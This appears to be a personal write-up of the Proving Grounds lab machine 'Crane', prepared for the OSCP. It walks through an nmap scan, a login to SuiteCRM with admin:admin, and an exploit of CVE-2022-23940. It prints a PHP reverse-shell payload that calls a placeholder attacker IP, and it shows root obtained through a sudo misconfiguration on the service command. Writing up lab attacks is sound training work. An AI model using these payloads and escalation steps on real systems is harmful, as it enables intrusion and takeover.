---
title: Crane - Intermediate - Linux - PG Practice
date: 2024-06-12
tags:
  - pg-practice
  - offsec
  - oscp-prep
  - linux
  - ospg
  - php
draft: false
---
# Crane - Intermediate - Linux - PG Practice

# **Scanning**

My basic scan runs the following command
```bash
nmap -sC -T5 -Pn -p- --min-rate=10000 $IP
```

```python
┌──(kali㉿kali)-[~/Desktop/PGPractice/Easy/Linux]
└─$ basic 192.168.217.146
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-11 15:19 EDT
Warning: 192.168.217.146 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.217.146
Host is up (0.11s latency).
Not shown: 49031 filtered tcp ports (no-response), 16501 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   2048 3780014a438630c979e7fb7f3ba41edd (RSA)
|   256 b618a1e198fb6cc687554510c6d445b9 (ECDSA)
|_  256 ab8f2de8a204e7b765d3fe5e931e0367 (ED25519)
80/tcp   open  http
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
| http-robots.txt: 1 disallowed entry 
|_/
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds
```

	Port 80 is running SuiteCRM which is vulnerable to CVE-2022-23940 (found after some googling)

Moreover, a pretty basic mistake of using default credentials where I used `admin:admin` to get inside the `SuiteCRM` as Administrator

	Heres a pro tip, Make Google your best friend, you wont regret, ask him anything and he will tell you everything, please do be stupid and learn how to Google. Heres an amazing resource for you.

https://giybf.com/
# **Exploitation**

We use the following exploit
https://github.com/manuelz120/CVE-2022-23940

```python
┌──(kali㉿kali)-[~/…/Easy/Linux/Crane/CVE-2022-23940]
└─$ python3 exploit.py --help
Usage: exploit.py [OPTIONS]

Options:
  -h, --host TEXT        Root of SuiteCRM installation. Defaults to
                         http://localhost
  -u, --username TEXT    Username
  -p, --password TEXT    password
  -P, --payload TEXT     Shell command to be executed on target system
  -d, --is_core BOOLEAN  SuiteCRM Core (>= 8.0.0). Defaults to False
  --help                 Show this message and exit.

  https://github.com/manuelz120/CVE-2022-23940
```

I make slight changes to the code, where I add the Machine IP as default. Running the exploit on local alongwith a listener gets us a `www-data` shell
```python
┌──(kali㉿kali)-[~/…/Easy/Linux/Crane/CVE-2022-23940]
└─$ python3 exploit.py -u admin -p admin --payload "php -r '\$sock=fsockopen(\"ATTACKER-IP\", 6969); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
```

```python
└─$ nc -lnvp 6969                
listening on [any] 6969 ...
connect to [ip] from (UNKNOWN) [192.168.217.146] 55124
/bin/sh: 0: can't access tty; job control turned off

$ whoami
www-data
```
# **Privilege Escalation**

I downloaded `linpeas.sh` for a thorough check but as always, I tried to look for a low-hanging fruit by running `sudo -l` and to my surprise this was the output.
```python
www-data@crane:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
```

Do you see it?

`/usr/sbin/service` is running with `sudo` permissions. Pretty straight forward now.
Going to GTFObins and found the command for Privilege Escalation
https://gtfobins.github.io/gtfobins/service/

```python
www-data@crane:/tmp$ sudo service ../../bin/sh
sudo service ../../bin/sh
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
email1.txt  proof.txt
# cat proof.txt
cat proof.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

This was way too easy, I think this machine should be kept in Easy category instead of Intemediate.